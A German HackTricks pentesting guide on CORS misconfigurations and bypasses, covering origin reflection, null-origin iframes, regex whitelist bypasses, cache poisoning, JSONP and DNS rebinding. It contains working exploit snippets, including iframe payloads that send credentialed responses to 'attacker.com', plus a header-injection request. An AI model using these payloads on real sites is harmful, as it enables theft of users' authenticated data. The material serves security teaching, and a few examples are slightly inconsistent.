# CORS - Konfigurationsfehler & Umgehung

<details>

<summary><strong>Lernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben m√∂chten** oder **HackTricks als PDF herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>

## Was ist CORS?

Cross-Origin Resource Sharing (CORS) ist ein Standard, der es Servern erm√∂glicht, festzulegen, wer auf ihre Ressourcen zugreifen kann und welche HTTP-Anfragemethoden von externen Quellen erlaubt sind.

Eine **Same-Origin**-Richtlinie besagt, dass ein **Server, der eine Ressource anfordert**, und der Server, der die **Ressource hostet**, das gleiche Protokoll (z. B. `http://`), den gleichen Domainnamen (z. B. `internal-web.com`) und den gleichen **Port** (z. B. 80) teilen m√ºssen. Unter dieser Richtlinie haben nur Webseiten aus der gleichen Dom√§ne und dem gleichen Port Zugriff auf die Ressourcen.

Die Anwendung der Same-Origin-Richtlinie im Kontext von `http://normal-website.com/example/example.html` wird wie folgt veranschaulicht:

| Aufgerufene URL                           | Zugriff erlaubt?                   |
| ----------------------------------------- | ---------------------------------- |
| `http://normal-website.com/example/`      | Ja: Identisches Schema, Dom√§ne und Port |
| `http://normal-website.com/example2/`     | Ja: Identisches Schema, Dom√§ne und Port |
| `https://normal-website.com/example/`     | Nein: Unterschiedliches Schema und Port |
| `http://en.normal-website.com/example/`   | Nein: Unterschiedliche Dom√§ne       |
| `http://www.normal-website.com/example/`  | Nein: Unterschiedliche Dom√§ne       |
| `http://normal-website.com:8080/example/` | Nein: Unterschiedlicher Port*       |

*Internet Explorer ignoriert die Portnummer bei der Durchsetzung der Same-Origin-Richtlinie und erm√∂glicht somit diesen Zugriff.

### `Access-Control-Allow-Origin`-Header

Dieser Header kann **mehrere Urspr√ºnge**, einen **`null`**-Wert oder einen Platzhalter **`*`** zulassen. Kein Browser unterst√ºtzt jedoch mehrere Urspr√ºnge, und die Verwendung des Platzhalters `*` unterliegt **Einschr√§nkungen**. (Der Platzhalter muss alleine verwendet werden, und seine Verwendung zusammen mit `Access-Control-Allow-Credentials: true` ist nicht zul√§ssig.)

Dieser Header wird **von einem Server** als Antwort auf eine von einer Website initiierte Anfrage nach einer Ressource aus einer anderen Dom√§ne ausgegeben, wobei der Browser automatisch einen `Origin`-Header hinzuf√ºgt.

### `Access-Control-Allow-Credentials`-Header

Standardm√§√üig werden Cross-Origin-Anfragen ohne Anmeldeinformationen wie Cookies oder den Autorisierungsheader gesendet. Ein server√ºbergreifender Server kann jedoch das Lesen der Antwort zulassen, wenn Anmeldeinformationen gesendet werden, indem der `Access-Control-Allow-Credentials`-Header auf **`true`** gesetzt wird.

Wenn dieser Wert auf `true` gesetzt ist, √ºbermittelt der Browser Anmeldeinformationen (Cookies, Autorisierungsheader oder TLS-Clientzertifikate).
```javascript
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
console.log(xhr.responseText);
}
}
xhr.open('GET', 'http://example.com/', true);
xhr.withCredentials = true;
xhr.send(null);
```

```javascript
fetch(url, {
credentials: 'include'
})
```

```javascript
const xhr = new XMLHttpRequest();
xhr.open('POST', 'https://bar.other/resources/post-here/');
xhr.setRequestHeader('X-PINGOTHER', 'pingpong');
xhr.setRequestHeader('Content-Type', 'application/xml');
xhr.onreadystatechange = handler;
xhr.send('<person><name>Arun</name></person>');
```
### CSRF Pre-Flight-Anfrage

### Verst√§ndnis von Pre-Flight-Anfragen in der Cross-Domain-Kommunikation

Bei der Initiierung einer Cross-Domain-Anfrage unter bestimmten Bedingungen, wie der Verwendung einer **nicht standardm√§√üigen HTTP-Methode** (alles au√üer HEAD, GET, POST), der Einf√ºhrung neuer **Header** oder der Verwendung eines speziellen **Content-Type-Header-Werts**, kann eine Pre-Flight-Anfrage erforderlich sein. Diese vorl√§ufige Anfrage, die die Methode **`OPTIONS`** verwendet, informiert den Server √ºber die Absichten der bevorstehenden Cross-Origin-Anfrage, einschlie√ülich der verwendeten HTTP-Methoden und Header.

Das Protokoll **Cross-Origin Resource Sharing (CORS)** schreibt diese Pre-Flight-√úberpr√ºfung vor, um die Durchf√ºhrbarkeit der angeforderten Cross-Origin-Operation zu bestimmen, indem die erlaubten Methoden, Header und die Vertrauensw√ºrdigkeit des Ursprungs √ºberpr√ºft werden. F√ºr ein detailliertes Verst√§ndnis, welche Bedingungen die Notwendigkeit einer Pre-Flight-Anfrage umgehen, siehe den umfassenden Leitfaden von [**Mozilla Developer Network (MDN)**](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple_requests).

Es ist wichtig zu beachten, dass das **Fehlen einer Pre-Flight-Anfrage nicht die Notwendigkeit f√ºr die Antwort, Autorisierungsheader zu tragen, aufhebt**. Ohne diese Header ist der Browser nicht in der Lage, die Antwort auf die Cross-Origin-Anfrage zu verarbeiten.

Betrachten Sie die folgende Darstellung einer Pre-Flight-Anfrage, die die Verwendung der Methode `PUT` zusammen mit einem benutzerdefinierten Header namens `Special-Request-Header` beabsichtigt:
```
OPTIONS /info HTTP/1.1
Host: example2.com
...
Origin: https://example.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Authorization
```
Als Antwort k√∂nnte der Server Header zur√ºckgeben, die die akzeptierten Methoden, den erlaubten Ursprung und andere Details zur CORS-Richtlinie anzeigen, wie unten gezeigt:

```http
Access-Control-Allow-Methods: GET, POST, PUT
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Headers: Content-Type
```

Diese Header geben an, dass der Server GET, POST und PUT als akzeptierte Methoden erlaubt. Der erlaubte Ursprung ist auf "https://example.com" beschr√§nkt und der erlaubte Header ist "Content-Type".
```markdown
HTTP/1.1 204 No Content
...
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Methods: PUT, POST, OPTIONS
Access-Control-Allow-Headers: Authorization
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 240
```
- **`Access-Control-Allow-Headers`**: Dieser Header gibt an, welche Header w√§hrend der eigentlichen Anfrage verwendet werden k√∂nnen. Der Server setzt ihn, um die erlaubten Header in Anfragen vom Client anzuzeigen.
- **`Access-Control-Expose-Headers`**: √úber diesen Header informiert der Server den Client dar√ºber, welche Header neben den einfachen Antwort-Headern als Teil der Antwort freigegeben werden k√∂nnen.
- **`Access-Control-Max-Age`**: Dieser Header gibt an, wie lange die Ergebnisse einer Vorausfluganfrage zwischengespeichert werden k√∂nnen. Der Server legt die maximale Zeit in Sekunden fest, die die Informationen, die von einer Vorausfluganfrage zur√ºckgegeben werden, wiederverwendet werden d√ºrfen.
- **`Access-Control-Request-Headers`**: Dieser Header wird in Vorausfluganfragen verwendet und vom Client gesetzt, um den Server dar√ºber zu informieren, welche HTTP-Header der Client in der eigentlichen Anfrage verwenden m√∂chte.
- **`Access-Control-Request-Method`**: Dieser Header wird ebenfalls in Vorausfluganfragen verwendet und vom Client gesetzt, um anzuzeigen, welche HTTP-Methode in der eigentlichen Anfrage verwendet wird.
- **`Origin`**: Dieser Header wird automatisch vom Browser gesetzt und gibt den Ursprung der Cross-Origin-Anfrage an. Der Server verwendet ihn, um zu beurteilen, ob die eingehende Anfrage basierend auf der CORS-Richtlinie erlaubt oder verweigert werden sollte.

Beachten Sie, dass normalerweise (abh√§ngig von Content-Type und gesetzten Headern) bei einer **GET/POST-Anfrage keine Vorausfluganfrage gesendet wird** (die Anfrage wird **direkt** gesendet), aber wenn Sie auf die **Header/Body der Antwort** zugreifen m√∂chten, muss sie einen _Access-Control-Allow-Origin_-Header enthalten, der dies erlaubt.\
**Daher sch√ºtzt CORS nicht vor CSRF (kann aber hilfreich sein).**

### **Vorausfluganfrage f√ºr lokale Netzwerkanfragen**

1. **`Access-Control-Request-Local-Network`**: Dieser Header ist in der Anfrage des Clients enthalten und kennzeichnet, dass die Anfrage auf eine Ressource im lokalen Netzwerk abzielt. Er dient als Kennzeichnung, um den Server dar√ºber zu informieren, dass die Anfrage aus dem lokalen Netzwerk stammt.

2. **`Access-Control-Allow-Local-Network`**: Als Antwort verwenden Server diesen Header, um mitzuteilen, dass die angeforderte Ressource f√ºr Entit√§ten au√üerhalb des lokalen Netzwerks freigegeben werden darf. Er dient als gr√ºnes Licht f√ºr den Austausch von Ressourcen √ºber verschiedene Netzwerkgrenzen hinweg und gew√§hrleistet einen kontrollierten Zugriff bei gleichzeitiger Einhaltung von Sicherheitsprotokollen.

Eine **g√ºltige Antwort, die die Anfrage des lokalen Netzwerks erlaubt**, muss auch den Header `Access-Controls-Allow-Local_network: true` in der Antwort enthalten:
```
HTTP/1.1 200 OK
...
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Methods: GET
Access-Control-Allow-Credentials: true
Access-Control-Allow-Local-Network: true
Content-Length: 0
...
```
{% hint style="warning" %}
Beachten Sie, dass die IP-Adresse **0.0.0.0** in Linux verwendet werden kann, um diese Anforderungen zur Umgehung des Zugriffs auf localhost zu umgehen, da diese IP-Adresse nicht als "lokal" betrachtet wird.

Es ist auch m√∂glich, die Anforderungen des lokalen Netzwerks zu umgehen, wenn Sie die √∂ffentliche IP-Adresse eines lokalen Endpunkts verwenden (wie die √∂ffentliche IP-Adresse des Routers). Denn in mehreren F√§llen wird der Zugriff gew√§hrt, selbst wenn auf die √∂ffentliche IP-Adresse zugegriffen wird, wenn es sich um das lokale Netzwerk handelt.


{% endhint %}

## Ausnutzbare Fehlkonfigurationen

Es wurde beobachtet, dass die Einstellung von `Access-Control-Allow-Credentials` auf **`true`** eine Voraussetzung f√ºr die meisten **echten Angriffe** ist. Diese Einstellung erlaubt es dem Browser, Anmeldeinformationen zu senden und die Antwort zu lesen, was die Effektivit√§t des Angriffs erh√∂ht. Ohne dies verringert sich der Vorteil, eine Anfrage √ºber den Browser zu stellen, im Vergleich zur manuellen Durchf√ºhrung, da das Ausnutzen von Benutzercookies nicht praktikabel ist.

### Ausnahme: Ausnutzung des Netzwerkstandorts als Authentifizierung

Eine Ausnahme besteht, wenn der Netzwerkstandort des Opfers als Form der Authentifizierung fungiert. Dadurch kann der Browser des Opfers als Proxy verwendet werden, um die IP-basierte Authentifizierung zur Zugriff auf Intranet-Anwendungen zu umgehen. Diese Methode weist √Ñhnlichkeiten mit DNS-Rebinding auf, ist jedoch einfacher auszunutzen.

### Reflektion von `Origin` in `Access-Control-Allow-Origin`

Das Szenario in der realen Welt, in dem der Wert des `Origin`-Headers in `Access-Control-Allow-Origin` reflektiert wird, ist theoretisch unwahrscheinlich, aufgrund von Einschr√§nkungen bei der Kombination dieser Header. Entwickler, die CORS f√ºr mehrere URLs aktivieren m√∂chten, k√∂nnen jedoch den `Access-Control-Allow-Origin`-Header dynamisch generieren, indem sie den Wert des `Origin`-Headers kopieren. Dieser Ansatz kann Sicherheitsl√ºcken einf√ºhren, insbesondere wenn ein Angreifer eine Domain verwendet, die so gestaltet ist, dass sie legitim erscheint und so die Validierungslogik t√§uscht.
```html
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://example.com/details',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='/log?key='+this.responseText;
};
</script>
```
### Ausnutzung des `null` Ursprungs

Der `null` Ursprung, der f√ºr Situationen wie Weiterleitungen oder lokale HTML-Dateien angegeben wird, hat eine einzigartige Position. Einige Anwendungen whitelisten diesen Ursprung, um die lokale Entwicklung zu erleichtern, und erm√∂glichen so versehentlich jeder Website, einen `null` Ursprung durch ein sandboxed iframe zu imitieren und dadurch die CORS-Beschr√§nkungen zu umgehen.
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://example/details',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='https://attacker.com//log?key='+encodeURIComponent(this.responseText);
};
</script>"></iframe>
```

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://example/details',true);
req.withCredentials = true;
req.send();
function reqListener() {
location='https://attacker.com//log?key='+encodeURIComponent(this.responseText);
};
</script>"></iframe>
```
### Bypass-Techniken f√ºr regul√§re Ausdr√ºcke

Wenn Sie auf eine Domain-Whitelist sto√üen, ist es entscheidend, nach Umgehungsm√∂glichkeiten zu suchen, z. B. das Anh√§ngen der Angreiferdomain an eine in der Whitelist enthaltene Domain oder die Ausnutzung von Schwachstellen bei der √úbernahme von Subdomains. Dar√ºber hinaus k√∂nnen bei der Dom√§nenvalidierung verwendete regul√§re Ausdr√ºcke Nuancen in den Dom√§nennamenskonventionen √ºbersehen und weitere Umgehungsm√∂glichkeiten bieten.

### Fortgeschrittene Bypass-Techniken f√ºr regul√§re Ausdr√ºcke

Regul√§re Ausdr√ºcke konzentrieren sich in der Regel auf alphanumerische Zeichen, Punkt (.), und Bindestrich (-), wobei andere M√∂glichkeiten vernachl√§ssigt werden. Zum Beispiel kann ein Dom√§nenname, der Zeichen enth√§lt, die von Browsern und regul√§ren Ausdr√ºcken unterschiedlich interpretiert werden, Sicherheitspr√ºfungen umgehen. Die Handhabung von Unterstrichzeichen in Subdomains durch Safari, Chrome und Firefox veranschaulicht, wie solche Unterschiede ausgenutzt werden k√∂nnen, um die Logik der Dom√§nenvalidierung zu umgehen.

**Weitere Informationen und Einstellungen f√ºr diesen Bypass finden Sie unter:** [**https://www.corben.io/advanced-cors-techniques/**](https://www.corben.io/advanced-cors-techniques/) **und** [**https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397**](https://medium.com/bugbountywriteup/think-outside-the-scope-advanced-cors-exploitation-techniques-dad019c68397)

![https://miro.medium.com/v2/resize:fit:720/format:webp/1*rolEK39-DDxeBgSq6KLKAA.png](<../.gitbook/assets/image (153).png>)

### Von XSS innerhalb einer Subdomain

Entwickler implementieren oft Abwehrmechanismen, um sich vor CORS-Exploitation zu sch√ºtzen, indem sie Domains in die Whitelist aufnehmen, die berechtigt sind, Informationen anzufordern. Trotz dieser Vorsichtsma√ünahmen ist die Sicherheit des Systems nicht narrensicher. Das Vorhandensein auch nur einer verwundbaren Subdomain innerhalb der in der Whitelist enthaltenen Domains kann die T√ºr zur CORS-Exploitation durch andere Schwachstellen wie XSS (Cross-Site Scripting) √∂ffnen.

Um dies zu veranschaulichen, betrachten Sie das Szenario, in dem die Domain `requester.com` in der Whitelist steht und auf Ressourcen einer anderen Domain, `provider.com`, zugreifen darf. Die serverseitige Konfiguration k√∂nnte wie folgt aussehen:
```javascript
if ($_SERVER['HTTP_HOST'] == '*.requester.com') {
// Access data
} else {
// Unauthorized access
}
```
In dieser Konfiguration haben alle Subdomains von `requester.com` Zugriff. Wenn jedoch eine Subdomain, z.B. `sub.requester.com`, durch eine XSS-Schwachstelle kompromittiert wird, kann ein Angreifer diese Schwachstelle ausnutzen. Ein Angreifer mit Zugriff auf `sub.requester.com` k√∂nnte beispielsweise die XSS-Schwachstelle ausnutzen, um die CORS-Richtlinien zu umgehen und b√∂swillig auf Ressourcen auf `provider.com` zuzugreifen.


### **Serverseitige Cache-Vergiftung**

**[Aus dieser Forschung](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)**

Es ist m√∂glich, dass durch Ausnutzung einer serverseitigen Cache-Vergiftung durch HTTP-Header-Injektion eine gespeicherte Cross-Site-Scripting (XSS)-Schwachstelle verursacht wird. Dieses Szenario tritt auf, wenn eine Anwendung den `Origin`-Header nicht auf illegale Zeichen √ºberpr√ºft und somit eine Schwachstelle insbesondere f√ºr Internet Explorer- und Edge-Benutzer entsteht. Diese Browser behandeln `\r` (0x0d) als legitimen HTTP-Header-Terminator, was zu HTTP-Header-Injektionsschwachstellen f√ºhrt.

Betrachten Sie die folgende Anfrage, bei der der `Origin`-Header manipuliert wird:
```text
GET / HTTP/1.1
Origin: z[0x0d]Content-Type: text/html; charset=UTF-7
```
Internet Explorer und Edge interpretieren die Antwort wie folgt:
```text
HTTP/1.1 200 OK
Access-Control-Allow-Origin: z
Content-Type: text/html; charset=UTF-7
```
W√§hrend es nicht m√∂glich ist, diese Schwachstelle direkt auszunutzen, indem man einen Webbrowser dazu bringt, einen fehlerhaften Header zu senden, kann eine manipulierte Anfrage manuell mit Tools wie Burp Suite generiert werden. Diese Methode k√∂nnte dazu f√ºhren, dass der Server-Cache die Antwort speichert und sie versehentlich anderen Benutzern zur Verf√ºgung stellt. Das manipulierte Payload zielt darauf ab, den Zeichensatz der Seite in UTF-7 zu √§ndern, eine Zeichencodierung, die aufgrund ihrer F√§higkeit, Zeichen auf eine Weise zu kodieren, die in bestimmten Kontexten als Skript ausgef√ºhrt werden kann, oft mit XSS-Schwachstellen in Verbindung gebracht wird.

F√ºr weitere Informationen zu gespeicherten XSS-Schwachstellen siehe [PortSwigger](https://portswigger.net/web-security/cross-site-scripting/stored).

**Hinweis**: Die Ausnutzung von Schwachstellen bei der HTTP-Header-Injektion, insbesondere durch Server-Cache-Vergiftung, unterstreicht die entscheidende Bedeutung der Validierung und Bereinigung aller vom Benutzer bereitgestellten Eingaben, einschlie√ülich der HTTP-Header. Verwenden Sie immer ein robustes Sicherheitsmodell, das eine Eingabevalidierung umfasst, um solche Schwachstellen zu verhindern.


### **Clientseitige Cache-Vergiftung**

**[Aus dieser Forschung](https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties)**

In diesem Szenario wird eine Instanz einer Webseite beobachtet, die den Inhalt eines benutzerdefinierten HTTP-Headers ohne ordnungsgem√§√üe Codierung widerspiegelt. Konkret spiegelt die Webseite den Inhalt des `X-User-id`-Headers zur√ºck, der b√∂sartiges JavaScript enthalten k√∂nnte, wie im Beispiel gezeigt, in dem der Header ein SVG-Bild-Tag enth√§lt, das beim Laden JavaScript-Code ausf√ºhrt.

Cross-Origin Resource Sharing (CORS)-Richtlinien erm√∂glichen das Senden von benutzerdefinierten Headern. Ohne dass die Antwort aufgrund von CORS-Beschr√§nkungen direkt vom Browser gerendert wird, scheint der Nutzen einer solchen Injektion begrenzt zu sein. Der entscheidende Punkt ergibt sich jedoch, wenn das Cache-Verhalten des Browsers ber√ºcksichtigt wird. Wenn der `Vary: Origin`-Header nicht angegeben ist, kann die b√∂sartige Antwort vom Browser zwischengespeichert werden. Anschlie√üend kann diese zwischengespeicherte Antwort direkt gerendert werden, wenn die URL aufgerufen wird, ohne dass eine direkte Renderng bei der urspr√ºnglichen Anfrage erforderlich ist. Dieser Mechanismus erh√∂ht die Zuverl√§ssigkeit des Angriffs durch die Nutzung des clientseitigen Cachings.

Um diesen Angriff zu veranschaulichen, wird ein JavaScript-Beispiel bereitgestellt, das in der Umgebung einer Webseite ausgef√ºhrt werden soll, z.B. √ºber ein JSFiddle. Dieses Skript f√ºhrt eine einfache Aktion aus: Es sendet eine Anfrage an eine angegebene URL mit einem benutzerdefinierten Header, der das b√∂sartige JavaScript enth√§lt. Nach erfolgreicher Anfrage versucht es, zur Ziel-URL zu navigieren und l√∂st dabei m√∂glicherweise die Ausf√ºhrung des injizierten Skripts aus, wenn die Antwort zwischengespeichert wurde und der `Vary: Origin`-Header nicht ordnungsgem√§√ü behandelt wurde.

Hier ist eine zusammengefasste Aufschl√ºsselung des verwendeten JavaScripts, um diesen Angriff auszuf√ºhren:
```html
<script>
function gotcha() { location=url }
var req = new XMLHttpRequest();
url = 'https://example.com/'; // Note: Be cautious of mixed content blocking for HTTP sites
req.onload = gotcha;
req.open('get', url, true);
req.setRequestHeader("X-Custom-Header", "<svg/onload=alert(1)>");
req.send();
</script>
```
## Umgehung

### XSSI (Cross-Site Script Inclusion) / JSONP

XSSI, auch bekannt als Cross-Site Script Inclusion, ist eine Art von Schwachstelle, die ausnutzt, dass die Same Origin Policy (SOP) nicht angewendet wird, wenn Ressourcen mit dem Skript-Tag eingebunden werden. Dies liegt daran, dass Skripte aus verschiedenen Domains eingebunden werden k√∂nnen m√ºssen. Diese Schwachstelle erm√∂glicht es einem Angreifer, auf Inhalte zuzugreifen und sie zu lesen, die mit dem Skript-Tag eingebunden wurden.

Diese Schwachstelle wird besonders bedeutsam, wenn es um dynamisches JavaScript oder JSONP (JSON mit Padding) geht, insbesondere wenn Umgebungsautorit√§tsinformationen wie Cookies zur Authentifizierung verwendet werden. Beim Anfordern einer Ressource von einem anderen Host werden die Cookies mitgesendet, was sie f√ºr den Angreifer zug√§nglich macht.

Um diese Schwachstelle besser zu verstehen und zu mindern, k√∂nnen Sie das BurpSuite-Plugin verwenden, das unter [https://github.com/kapytein/jsonp](https://github.com/kapytein/jsonp) verf√ºgbar ist. Dieses Plugin kann Ihnen helfen, potenzielle XSSI-Schwachstellen in Ihren Webanwendungen zu identifizieren und zu beheben.

[**Lesen Sie hier mehr √ºber die verschiedenen Arten von XSSI und wie man sie ausnutzt.**](xssi-cross-site-script-inclusion.md)

Versuchen Sie, einen **`callback`** **Parameter** in der Anfrage hinzuzuf√ºgen. M√∂glicherweise wurde die Seite so vorbereitet, dass sie die Daten als JSONP sendet. In diesem Fall sendet die Seite die Daten mit `Content-Type: application/javascript` zur√ºck, was die CORS-Richtlinie umgeht.

![](<../.gitbook/assets/image (229).png>)

### Einfache (nutzlose?) Umgehung

Eine M√∂glichkeit, die `Access-Control-Allow-Origin`-Beschr√§nkung zu umgehen, besteht darin, eine Webanwendung aufzufordern, eine Anfrage in Ihrem Namen zu stellen und die Antwort zur√ºckzusenden. In diesem Szenario werden jedoch die Anmeldeinformationen des endg√ºltigen Opfers nicht gesendet, da die Anfrage an eine andere Domain gestellt wird.

1. [**CORS-escape**](https://github.com/shalvah/cors-escape): Dieses Tool bietet einen Proxy, der Ihre Anfrage zusammen mit ihren Headern weiterleitet und gleichzeitig den Origin-Header f√§lscht, um zur angeforderten Domain zu passen. Dadurch wird die CORS-Richtlinie effektiv umgangen. Hier ist ein Beispiel f√ºr die Verwendung mit XMLHttpRequest:

2. [**simple-cors-escape**](https://github.com/shalvah/simple-cors-escape): Dieses Tool bietet einen alternativen Ansatz zum Proxying von Anfragen. Anstatt Ihre Anfrage unver√§ndert weiterzuleiten, stellt der Server seine eigene Anfrage mit den angegebenen Parametern.

### Iframe + Popup-Umgehung

Sie k√∂nnen **CORS-Pr√ºfungen** wie `e.origin === window.origin` umgehen, indem Sie ein **Iframe erstellen** und **daraus ein neues Fenster √∂ffnen**. Weitere Informationen finden Sie auf der folgenden Seite:

{% content-ref url="xss-cross-site-scripting/iframes-in-xss-and-csp.md" %}
[iframes-in-xss-and-csp.md](xss-cross-site-scripting/iframes-in-xss-and-csp.md)
{% endcontent-ref %}

### DNS-Rebinding √ºber TTL

DNS-Rebinding √ºber TTL ist eine Technik, die verwendet wird, um bestimmte Sicherheitsma√ünahmen zu umgehen, indem DNS-Eintr√§ge manipuliert werden. So funktioniert es:

1. Der Angreifer erstellt eine Webseite und l√§sst das Opfer darauf zugreifen.
2. Der Angreifer √§ndert dann die DNS (IP) seiner eigenen Domain, um auf die Webseite des Opfers zu verweisen.
3. Der Browser des Opfers zwischenspeichert die DNS-Antwort, die eine TTL (Time to Live)-Wert enth√§lt, der angibt, wie lange der DNS-Eintrag als g√ºltig betrachtet werden soll.
4. Wenn die TTL abl√§uft, stellt der Browser des Opfers eine neue DNS-Anfrage, was es dem Angreifer erm√∂glicht, JavaScript-Code auf der Seite des Opfers auszuf√ºhren.
5. Indem der Angreifer die Kontrolle √ºber die IP des Opfers beh√§lt, kann er Informationen vom Opfer sammeln, ohne Cookies an den Server des Opfers zu senden.

Es ist wichtig zu beachten, dass Browser Caching-Mechanismen haben, die einen sofortigen Missbrauch dieser Technik verhindern k√∂nnen, selbst bei niedrigen TTL-Werten.

DNS-Rebinding kann n√ºtzlich sein, um explizite IP-Pr√ºfungen zu umgehen, die vom Opfer durchgef√ºhrt werden, oder f√ºr Szenarien, in denen ein Benutzer oder Bot f√ºr einen l√§ngeren Zeitraum auf derselben Seite bleibt und der Cache abl√§uft.

Wenn Sie eine schnelle M√∂glichkeit zum Missbrauch von DNS-Rebinding ben√∂tigen, k√∂nnen Sie Dienste wie [https://lock.cmpxchg8b.com/rebinder.html](https://lock.cmpxchg8b.com/rebinder.html) verwenden.

Um Ihren eigenen DNS-Rebinding-Server auszuf√ºhren, k√∂nnen Sie Tools wie **DNSrebinder** ([https://github.com/mogwailabs/DNSrebinder](https://github.com/mogwailabs/DNSrebinder)) nutzen. Dies beinhaltet das Freigeben Ihres lokalen Ports 53/udp, das Erstellen eines A-Eintrags, der darauf verweist (z.B. ns.example.com), und das Erstellen eines NS-Eintrags, der auf den zuvor erstellten A-Subdomain verweist (z.B. ns.example.com). Jede Subdomain der ns.example.com-Subdomain wird dann von Ihrem Host aufgel√∂st.

Sie k√∂nnen auch einen √∂ffentlich laufenden Server unter [http://rebind.it/singularity.html](http://rebind.it/singularity.html) erkunden, um ein besseres Verst√§ndnis und Experimente durchzuf√ºhren.

### DNS-Rebinding √ºber **DNS-Cache-Flutung**

DNS-Rebinding √ºber DNS-Cache-Flutung ist eine weitere Technik, die verwendet wird, um den Caching-Mechanismus von Browsern zu umgehen und eine zweite DNS-Anfrage zu erzwingen. So funktioniert es:

1. Zun√§chst erh√§lt das Opfer bei einer DNS-Anfrage die IP-Adresse des Angreifers als Antwort.
2. Um die Caching-Verteidigung zu umgehen, nutzt der Angreifer einen Service Worker. Der Service Worker flutet den DNS-Cache, wodurch der zwischengespeicherte Angreifer-Servername effektiv gel√∂scht wird.
3. Wenn der Browser des Opfers eine zweite DNS-Anfrage stellt, erh√§lt er nun die IP-Adresse 127.0.0.1, die normalerweise auf den localhost verweist.

Durch Fluten des DNS-Caches mit dem Service Worker kann der Angreifer den DNS-Aufl√∂sungsprozess manipulieren und den Browser des Opfers dazu zwingen, eine zweite Anfrage zu stellen, die diesmal zur gew√ºnschten IP-Adresse des Angreifers aufl√∂st.

### DNS-Rebinding √ºber **Cache**

Eine weitere M√∂glichkeit, die Caching-Verteidigung zu umgehen, besteht darin, mehrere IP-Adressen f√ºr dieselbe Subdomain beim DNS-Anbieter zu verwenden. So funktioniert es:

1. Der Angreifer richtet zwei A-Eintr√§ge (oder einen einzelnen A-Eintrag mit zwei IPs) f√ºr dieselbe Subdomain beim DNS-Anbieter ein.
2. Wenn ein Browser diese Eintr√§ge √ºberpr√ºft, erh√§lt er beide IP-Adressen.
3. Wenn der Browser sich entscheidet, die IP-Adresse des Angreifers zuerst zu verwenden, kann der Angreifer eine Nutzlast bereitstellen, die HTTP-Anfragen an dieselbe Domain sendet.
4. Sobald der Angreifer die IP-Adresse des Opfers erhalten hat, h√∂rt er auf, auf den Browser des Opfers zu antworten.
5. Der Browser des Opfers erkennt, dass die Domain nicht erreichbar ist, und verwendet stattdessen die zweite angegebene IP-Adresse.
6. Durch den Zugriff auf die zweite IP-Adresse umgeht der Browser die Same Origin Policy (SOP), was es dem Angreifer erm√∂glicht, dies auszunutzen und Informationen vom Opfer zu sammeln und zu exfiltrieren.

Diese Technik nutzt das Verhalten von Browsern aus, wenn mehrere IP-Adressen f√ºr eine Domain bereitgestellt werden. Indem die Antworten strategisch kontrolliert und die Wahl der IP-Adresse des Browsers manipuliert wird, kann ein Angreifer die SOP ausnutzen und auf Informationen des Opfers zugreifen.

{% hint style="warning" %}
Beachten Sie, dass Sie zum Zugriff auf localhost versuchen sollten, **127.0.0.1** in Windows und **0.0.0.0** in Linux zu verwenden.\
Anbieter wie Godaddy oder Cloudflare haben es mir nicht erlaubt, die IP-Adresse 0.0.0.0 zu verwenden, aber AWS Route53 hat es mir erm√∂glicht, einen A-Eintrag mit 2 IPs zu erstellen, wobei eine davon "0.0.0.0" ist.

<img src="../.gitbook/assets/image (638) (2) (1) (1) (1).png" alt="" data-size="original">
{% endhint %}

Weitere Informationen finden Sie unter [https://unit42.paloaltonetworks.com/dns-rebinding/](https://unit42.paloaltonetworks.com/dns-rebinding/)
### Weitere g√§ngige Umgehungen

* Wenn **interne IPs nicht erlaubt sind**, haben sie m√∂glicherweise **vergessen, 0.0.0.0 zu verbieten** (funktioniert auf Linux und Mac).
* Wenn **interne IPs nicht erlaubt sind**, antworten Sie mit einem **CNAME** auf **localhost** (funktioniert auf Linux und Mac).
* Wenn **interne IPs nicht als DNS-Antworten erlaubt sind**, k√∂nnen Sie **CNAMEs auf interne Dienste** wie www.corporate.internal antworten.

### DNS-Rebinding weaponisiert

Weitere Informationen zu den zuvor genannten Umgehungstechniken und zur Verwendung des folgenden Tools finden Sie in dem Vortrag [Gerald Doussot - State of DNS Rebinding Attacks & Singularity of Origin - DEF CON 27 Conference](https://www.youtube.com/watch?v=y9-0lICNjOQ).

